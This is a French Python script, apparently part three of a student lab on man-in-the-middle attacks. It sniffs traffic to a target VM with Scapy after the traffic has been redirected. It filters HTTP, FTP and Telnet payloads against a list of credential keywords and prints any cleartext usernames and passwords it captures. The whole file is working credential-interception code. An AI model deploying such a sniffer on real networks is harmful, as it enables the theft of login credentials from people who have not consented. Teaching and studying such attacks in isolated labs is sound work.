# ==============================================================================
# SCRIPT UTILITY - PARTIE III : ANALYSE POST-INTERCEPTION (POST-MitM)
# À intégrer ou à exécuter une fois le trafic redirigé par la Partie II
# ==============================================================================
import sys
from scapy.all import sniff, IP, TCP, Raw

# Liste des mots-clés de sécurité pour filtrer les identifiants dans le texte brut
CRED_KEYWORDS = [b"user", b"username", b"password", b"passwd", b"login", b"auth", b"pwd"]

def process_intercepted_packet(packet):
    """
    Analyse la charge utile applicative des paquets réseau interceptés.
    Recherche des transmissions de mots de passe ou d'identifiants en clair.
    """
    # Extraction des couches réseau obligatoires (IP -> TCP -> Données brutes)
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        payload = packet[Raw].load  # Contenu brut du message applicatif

        # Filtrage applicatif : ciblage des protocoles non chiffrés (HTTP, FTP, Telnet)
        if dst_port in [80, 21, 23] or src_port in [80, 21, 23]:
            payload_lower = payload.lower()
            
            # Vérification de la présence de données d'authentification suspectes
            if any(keyword in payload_lower for keyword in CRED_KEYWORDS):
                print("\n" + "="*70)
                print("[+] ALERTE PARTIE III : DONNÉES SENSIBLES INTERCEPTÉES EN TEXTE CLAIR")
                print(f"[*] Flux réseau : {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
                print("-"*70)
                print("[*] Contenu applicatif extrait (Raw Payload) :")
                try:
                    # Décodage lisible pour l'affichage dans le terminal de test
                    print(payload.decode('utf-8', errors='ignore').strip())
                except Exception as e:
                    print(f"[!] Erreur d'affichage des données : {e}")
                print("="*70 + "\n")

def run_partie_3(target_ip):
    """
    Point d'entrée principal pour la Partie III.
    Écoute passivement les paquets liés à la machine victime.
    """
    print(f"[*] Activation de la PARTIE III : Analyseur applicatif sur l'hôte {target_ip}...")
    print("[*] En attente de paquets non chiffrés (HTTP / FTP / Telnet)...")
    
    # Filtre de capture réseau (BPF) restreint à l'adresse IP de la cible
    bpf_filter = f"ip host {target_ip}"
    
    # Lancement du renifleur Scapy (store=False évite l'engorgement de la mémoire vive)
    sniff(filter=bpf_filter, prn=process_intercepted_packet, store=False)

if __name__ == "__main__":
    # Adresse IP de la VM Debian cible (issue des résultats de la Partie I du groupe)
    VM_CIBLE_IP = "192.168.48.2" 
    
    try:
        run_partie_3(VM_CIBLE_IP)
    except KeyboardInterrupt:
        print("\n[-] Arrêt du module d'analyse applicative (Partie III).")
        sys.exit(0)
